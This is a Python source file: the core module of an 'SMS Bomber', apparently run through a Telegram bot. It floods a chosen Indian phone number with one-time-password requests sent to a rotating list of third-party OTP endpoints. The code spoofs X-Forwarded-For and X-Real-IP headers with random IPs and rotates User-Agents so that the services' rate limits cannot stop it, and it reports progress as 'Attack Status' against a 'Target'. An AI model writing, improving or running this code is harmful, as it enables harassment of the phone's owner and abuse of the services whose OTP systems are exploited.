#!/usr/bin/env python3
"""
SMS Bomber Core Module - FIXED
Async implementation with proper error handling and rate limiting
"""

import asyncio
import aiohttp
import random
import secrets
import ssl
import time
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Callable, Any
from datetime import datetime
import logging

from config import TARGET_ENDPOINTS, USER_AGENTS, DEFAULT_HEADERS, rate_limits, OTPEndpoint

logger = logging.getLogger(__name__)


@dataclass
class AttackStats:
    """Attack statistics tracker"""
    total: int = 0
    success: int = 0
    failed: int = 0
    start_time: Optional[float] = None
    end_time: Optional[float] = None
    current_endpoint: str = ""
    errors: List[str] = field(default_factory=list)
    target_count: int = 0

    @property
    def duration(self) -> float:
        if not self.start_time:
            return 0.0
        end = self.end_time or time.time()
        return end - self.start_time

    @property
    def rate(self) -> float:
        if self.duration == 0:
            return 0.0
        return self.total / self.duration

    @property
    def progress_pct(self) -> float:
        if self.target_count <= 0:
            return 0.0
        return min(100.0, (self.total / self.target_count) * 100)


class RateLimiter:
    """Token bucket rate limiter"""

    def __init__(self, rate: float, burst: int):
        self.rate = rate
        self.burst = burst
        self.tokens = float(burst)
        self.last_update = time.time()
        self._lock = asyncio.Lock()

    async def acquire(self):
        async with self._lock:
            now = time.time()
            elapsed = now - self.last_update
            self.tokens = min(float(self.burst), self.tokens + elapsed * self.rate)
            self.last_update = now

            if self.tokens < 1:
                wait_time = (1 - self.tokens) / self.rate
                await asyncio.sleep(wait_time)
                self.tokens = 0.0
            else:
                self.tokens -= 1.0


class SMSBomber:
    """
    Production-grade SMS Bomber
    - Async/await throughout
    - Proper connection pooling
    - Rate limiting
    - Comprehensive error handling
    """

    def __init__(
        self,
        phone_number: str,
        count: int,
        progress_callback: Optional[Callable[[AttackStats], Any]] = None
    ):
        self.phone = self._normalize_phone(phone_number)
        self.count = min(count, rate_limits.MAX_ATTEMPTS_PER_USER)
        self.progress_callback = progress_callback

        self.stats = AttackStats(target_count=self.count)
        self._stop_event = asyncio.Event()
        self._lock = asyncio.Lock()
        self._rate_limiter = RateLimiter(rate=2.0, burst=5)
        self._session: Optional[aiohttp.ClientSession] = None
        self._ssl_context = ssl.create_default_context()

    def _normalize_phone(self, phone: str) -> str:
        """Normalize to +91XXXXXXXXXX format and reject invalid input."""
        if not phone:
            raise ValueError("Phone number is required")

        digits = ''.join(filter(str.isdigit, phone.strip()))
        if len(digits) == 10 and digits[0] in "6789":
            return f"+91{digits}"
        if len(digits) == 12 and digits.startswith("91") and digits[2] in "6789":
            return f"+{digits}"
        if len(digits) == 13 and digits.startswith("091") and digits[3] in "6789":
            return f"+{digits[1:]}"

        raise ValueError("Invalid phone number format")

    def _format_payload(self, endpoint: OTPEndpoint) -> Dict[str, Any]:
        """Format payload with phone number"""
        phone_clean = self.phone.replace("+", "")
        phone_10 = phone_clean[-10:]

        if not endpoint.payload_template:
            return {endpoint.phone_param: self.phone}

        payload = {}
        for key, value in endpoint.payload_template.items():
            if isinstance(value, str):
                value = value.replace("{phone}", self.phone)
                value = value.replace("{phone_clean}", phone_clean)
                value = value.replace("{phone_10}", phone_10)
            payload[key] = value
        return payload

    def _get_headers(self, endpoint: OTPEndpoint) -> Dict[str, str]:
        """Generate request headers with random User-Agent"""
        headers = DEFAULT_HEADERS.copy()
        headers["User-Agent"] = random.choice(USER_AGENTS)

        # Random forwarded IP
        ip = (
            f"{secrets.randbelow(246) + 10}.{secrets.randbelow(256)}"
            f".{secrets.randbelow(256)}.{secrets.randbelow(254) + 1}"
        )
        headers["X-Forwarded-For"] = ip
        headers["X-Real-IP"] = ip

        if endpoint.headers:
            headers.update(endpoint.headers)

        return headers

    async def _send_otp(self, endpoint: OTPEndpoint) -> bool:
        """Send single OTP request to one endpoint"""
        if self._stop_event.is_set():
            return False

        # Check session is available
        if self._session is None or self._session.closed:
            logger.warning("Session not available, skipping request")
            return False

        await self._rate_limiter.acquire()

        async with self._lock:
            self.stats.current_endpoint = endpoint.name

        payload = self._format_payload(endpoint)
        headers = self._get_headers(endpoint)

        try:
            timeout = aiohttp.ClientTimeout(total=endpoint.timeout)
            is_json = headers.get("Content-Type") == "application/json"

            if endpoint.method.upper() == "GET":
                async with self._session.get(
                    endpoint.url,
                    params=payload,
                    headers=headers,
                    timeout=timeout,
                    ssl=self._ssl_context
                ) as response:
                    success = response.status in (200, 201, 202, 204)
            else:
                async with self._session.post(
                    endpoint.url,
                    json=payload if is_json else None,
                    data=payload if not is_json else None,
                    headers=headers,
                    timeout=timeout,
                    ssl=self._ssl_context
                ) as response:
                    success = response.status in (200, 201, 202, 204)

            async with self._lock:
                self.stats.total += 1
                if success:
                    self.stats.success += 1
                else:
                    self.stats.failed += 1

            return success

        except asyncio.TimeoutError:
            async with self._lock:
                self.stats.total += 1
                self.stats.failed += 1
                if len(self.stats.errors) < 10:
                    self.stats.errors.append(f"{endpoint.name}: timeout")
            return False

        except aiohttp.ClientError as e:
            async with self._lock:
                self.stats.total += 1
                self.stats.failed += 1
                if len(self.stats.errors) < 10:
                    self.stats.errors.append(f"{endpoint.name}: {str(e)[:50]}")
            return False

        except Exception as e:
            async with self._lock:
                self.stats.total += 1
                self.stats.failed += 1
                if len(self.stats.errors) < 10:
                    self.stats.errors.append(f"{endpoint.name}: unexpected error")
            logger.error(f"Unexpected error for {endpoint.name}: {e}")
            return False

    async def _progress_updater(self):
        """Background task to send adaptive progress updates."""
        failure_count = 0
        while not self._stop_event.is_set() and self.stats.total < self.count:
            if self.progress_callback:
                try:
                    result = self.progress_callback(self.stats)
                    if asyncio.iscoroutine(result):
                        await result
                    failure_count = 0
                except Exception as e:
                    failure_count += 1
                    logger.error(f"Progress callback error: {e}")

            if self.count <= 20:
                interval = 1.0
            elif self.count <= 100:
                interval = 2.0
            else:
                interval = 3.0

            interval = min(8.0, interval * (2 ** min(failure_count, 3)))
            await asyncio.sleep(interval)

    async def start(self) -> AttackStats:
        """Start the SMS bombing attack"""
        if not TARGET_ENDPOINTS:
            logger.error("No endpoints configured!")
            self.stats.start_time = time.time()
            self.stats.end_time = time.time()
            return self.stats

        self.stats.start_time = time.time()
        self._stop_event.clear()

        connector = aiohttp.TCPConnector(
            limit=50,
            limit_per_host=5,
            ttl_dns_cache=300,
            use_dns_cache=True,
        )

        timeout = aiohttp.ClientTimeout(total=30)

        async with aiohttp.ClientSession(
            connector=connector,
            timeout=timeout
        ) as self._session:
            # Start progress updater in background
            progress_task = asyncio.create_task(self._progress_updater())

            tasks = []
            endpoints = list(TARGET_ENDPOINTS)

            for i in range(self.count):
                if self._stop_event.is_set():
                    break

                endpoint = endpoints[i % len(endpoints)]
                task = asyncio.create_task(self._send_otp(endpoint))
                tasks.append(task)

                # Stagger requests to avoid thundering herd
                if i % 10 == 0 and i > 0:
                    await asyncio.sleep(0.1)

            # Wait for all OTP tasks to complete
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)

            # Stop progress updater
            self._stop_event.set()
            try:
                await asyncio.wait_for(progress_task, timeout=3.0)
            except asyncio.TimeoutError:
                progress_task.cancel()
                try:
                    await progress_task
                except asyncio.CancelledError:
                    pass

        self.stats.end_time = time.time()
        return self.stats

    async def stop(self):
        """Stop the attack gracefully"""
        self._stop_event.set()

    def get_progress_bar(self, width: int = 20) -> str:
        """Generate ASCII progress bar"""
        if self.count == 0:
            return "[░░░░░░░░░░░░░░░░░░░░] 0%"

        pct = min(100.0, (self.stats.total / self.count) * 100)
        filled = int(width * pct / 100)
        bar = "█" * filled + "░" * (width - filled)
        return f"[{bar}] {pct:.1f}%"

    def format_status(self) -> str:
        """Format current status for Telegram message display"""
        return f"""
📊 **Attack Status**

{self.get_progress_bar()} ({self.stats.progress_pct:.1f}%)

📱 Target: `{self.phone}`
📤 Sent: {self.stats.total}/{self.count}
✅ Success: {self.stats.success}
❌ Failed: {self.stats.failed}
⚡ Rate: {self.stats.rate:.1f} req/s
⏱️ Duration: {self.stats.duration:.1f}s
🌐 Current: {self.stats.current_endpoint or 'Starting...'}
"""


def validate_phone(phone: str) -> tuple[bool, str]:
    """Validate and normalize Indian phone number"""
    if not phone or not phone.strip():
        return False, "Phone number cannot be empty"

    digits = ''.join(filter(str.isdigit, phone.strip()))

    if len(digits) == 10:
        # Must start with 6-9 for Indian mobile numbers
        if digits[0] not in "6789":
            return False, "Invalid Indian mobile number (must start with 6, 7, 8, or 9)"
        return True, f"+91{digits}"

    elif len(digits) == 12 and digits.startswith("91"):
        if digits[2] not in "6789":
            return False, "Invalid Indian mobile number"
        return True, f"+{digits}"

    elif len(digits) == 13 and digits.startswith("091"):
        if digits[3] not in "6789":
            return False, "Invalid Indian mobile number"
        return True, f"+{digits[1:]}"

    return False, "Invalid format. Use: +91XXXXXXXXXX or 10-digit Indian number"


# Quick test
if __name__ == "__main__":
    async def test():
        print("Testing SMS Bomber...")
        bomber = SMSBomber("+919999999999", 3)
        stats = await bomber.start()
        print(f"Test complete: total={stats.total}, success={stats.success}, failed={stats.failed}")

    asyncio.run(test())
